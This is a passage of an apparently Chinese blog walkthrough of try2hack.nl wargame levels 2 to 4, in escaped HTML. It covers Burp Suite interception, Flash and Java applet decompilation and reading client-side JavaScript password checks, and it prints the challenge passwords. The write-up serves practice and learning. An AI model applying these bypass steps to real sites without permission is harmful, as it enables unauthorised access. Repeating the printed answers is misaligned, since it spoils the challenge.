class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script type=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!--&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  passwd=&quot;ItIsSoEasy&quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  function disable_right_click(e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var browser = navigator.appName.substring ( 0, 9 );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var event_number = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (browser==&quot;Microsoft&quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      event_number = event.button;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    else&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      event_number = e.which;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if ( event_number==2 || event_number==3 || event_number==4) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      alert (&quot;Right/middle mousebutton is disabled&quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      return (false);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return (true);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  function check_mousekey () &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var mouse_key = 93;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var keycode = event.keyCode;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if ( keycode == mouse_key )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      alert ( &quot;Mouse Key Is Disabled&quot; );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  function trap_page_mouse_key_events () &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var browser = navigator.appName.substring ( 0, 9 );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    document.onmousedown = disable_right_click;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if ( browser == &quot;Microsoft&quot; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      document.onkeydown = check_mousekey;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    else&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      document.captureEvents( Event.MOUSEDOWN );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  window.onload = trap_page_mouse_key_events;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  //--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;以上这段JS的目的是定义我们不能使用鼠标右键，这个问题可以很容易的解决：我们只需用burpsuit拦截服务器的响应，修改响应代码并去掉该JS中的第一段Function代码，然后让在浏览器端正常加载就可以了。可是这样做了之后，虽然可以正常查看页面源代码了，可是通过查看页面源代码好像无所收获。然后我们继续通过burpsuit观察：&lt;br&gt;&lt;img src=&quot;/images/try2hack/7.png&quot; alt=&quot;7&quot;&gt;&lt;br&gt;以上是加载该页面时拦截到的两个请求，可看到该页面是分两步加载的。第二部分是一个flash文件，而这个flash文件正是我们输入用户名和密码的地方。现在单独分析该flash文件，根据URL把该flash文件下载到本地，用记事本打开发现是乱码。于是考虑可能需要反编译该flash文件，看看它对应的源码是什么。接着然后我们找了一个能提供&lt;a href=&quot;http://www.showmycode.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线反编译的网站&lt;/a&gt;，在该网站中将我们flash的URL输入进去，出现如下反编译后的结果：&lt;br&gt;&lt;img src=&quot;/images/try2hack/8.png&quot; alt=&quot;8&quot;&gt;&lt;br&gt;可以看到该函数是一个判断语句，当用户名为：try2hack，密码为：irtehh4x0r! 时通过，于是输入之后，第二关就过了。&lt;br&gt;&lt;strong&gt;总结：这一关主要考查网页flash文件的反编译。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;Level-3&quot;&gt;&lt;a href=&quot;#Level-3&quot; class=&quot;headerlink&quot; title=&quot;Level 3&quot;&gt;&lt;/a&gt;Level 3&lt;/h3&gt;&lt;p&gt;网址：&lt;a href=&quot;http://www.try2hack.nl/levels/level3-.xhtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.try2hack.nl/levels/level3-.xhtml&lt;/a&gt;&lt;br&gt;刚刚进入第三关，展现在眼前的就是这样一个页面：&lt;br&gt;&lt;img src=&quot;/images/try2hack/9.png&quot; alt=&quot;9&quot;&gt;&lt;br&gt;尝试随便输入几个密码，输入错误之后，又进入了迪斯尼的页面。。。&lt;br&gt;并且发现从第二关跳到第三关的过程中burpsuit居然拦截不到任何请求，因此估计这又是一个客户端的JS验证。观察到第二关通过时所跳转的URL为：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://www.try2hack.nl/levels/level3-.xhtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.try2hack.nl/levels/level3-.xhtml&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;发现用浏览器打开该URL后，右键居然看不到源代码。好吧，我把你用迅雷下载下来再用记事本打开总看的到源代码吧，果然，源代码是这样的：&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script type=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!--&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  pwd = prompt(&quot;Please enter the password for level 3:&quot;,&quot;&quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  if (pwd==PASSWORD)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    alert(&quot;Allright!\nEntering Level 4 ...&quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    location.href = CORRECTSITE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    alert(&quot;WRONG!\nBack to disneyland !!!&quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    location.href = WRONGSITE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  PASSWORD=&quot;AbCdE&quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  CORRECTSITE=&quot;level4-sfvfxc.xhtml&quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  WRONGSITE=&quot;http://www.disney.com&quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  //--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输入密码：AbCdE，居然显示不对？！然后我就很疑惑了，其值是不是在程序运行过程中有修改呢？于是我在这段脚本里面设断点，希望能够通过firebug调试观察password的值，可是设好断点，点击之后，根本不在断点处停下来，这是怎么回事？于是我猜想，这说明我们点击确定的代码根本没有运行到这里就被判断了。然后再看看firebug里面的脚本：&lt;br&gt;&lt;img src=&quot;/images/try2hack/10.png&quot; alt=&quot;10&quot;&gt;&lt;br&gt;居然有两个脚本，点开另外一个脚本，显示如下内容：&lt;br&gt;&lt;img src=&quot;/images/try2hack/11.png&quot; alt=&quot;11&quot;&gt;&lt;br&gt;我感觉我被欺骗了，也就是说，真正运行的是后面这段脚本！输入密码：try2hackrawks，果然顺利通过。&lt;br&gt;但这里有一个疑问，后面这一段应该称不上脚本，也就是说最终的判断还是在level3-.xhtml中实现的，那这里JavaScript里面的密码是如何被赋值到level3-.xhtml中的呢？我猜想JavaScript中应该是一个预先的预定义值，相当于初始化变量，然后其实后面的语句其实是对password变量值的修改，也就是说程序时通过第一次的值进行验证的。&lt;br&gt;为了检验我的猜想，再次设断点，运行，停下来了，原来之前停不下来是因为断点位置没有设好，那么下图则看的很清晰了：&lt;br&gt;&lt;img src=&quot;/images/try2hack/12.png&quot; alt=&quot;12&quot;&gt;&lt;br&gt;&lt;strong&gt;总结：这一关主要考查获取页面源代码和JS运行原理和流程。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;Level-4&quot;&gt;&lt;a href=&quot;#Level-4&quot; class=&quot;headerlink&quot; title=&quot;Level 4&quot;&gt;&lt;/a&gt;Level 4&lt;/h3&gt;&lt;p&gt;网址：&lt;a href=&quot;http://www.try2hack.nl/levels/level4-kdnvxs.xhtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.try2hack.nl/levels/level4-kdnvxs.xhtml&lt;/a&gt;&lt;br&gt;来到第四关，展现在眼前的居然是一片白板！？纳尼？&lt;br&gt;&lt;img src=&quot;/images/try2hack/13.png&quot; alt=&quot;13&quot;&gt;&lt;br&gt;查看页面源代码显示如下：&lt;br&gt;&lt;img src=&quot;/images/try2hack/33.png&quot; alt=&quot;33&quot;&gt;&lt;br&gt;以上代码绿色部分表示除IE外其他浏览器都能识别，详细说明见&lt;a href=&quot;http://www.cnblogs.com/thinkingthigh/archive/2013/06/19/3144239.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;。从该代码可以看出这是一个Java Applet的小程序，并且该小程序的URL地址为：&lt;a href=&quot;http://try2hack.nl/levels/PasswdLevel4.class&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://try2hack.nl/levels/PasswdLevel4.class&lt;/a&gt;  。而页面之所以不显示出来，是因为我们没有装Java runtime environment。但是后来即使装了，也是这样的报错：&lt;br&gt;&lt;img src=&quot;/images/try2hack/34.png&quot; alt=&quot;34&quot;&gt;&lt;br&gt;为了解决这个错误，我把谷歌百度翻了个底朝天，并且至少试了四种不同的浏览器，最后依然没有解决。但总体上该报错应该是版本问题，现在很少有浏览器支持Applet了，还有一个可能性是需要小程序有正式的签名，不得而知。把该.class文件下载下来，反编译后得到源码如下:&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span 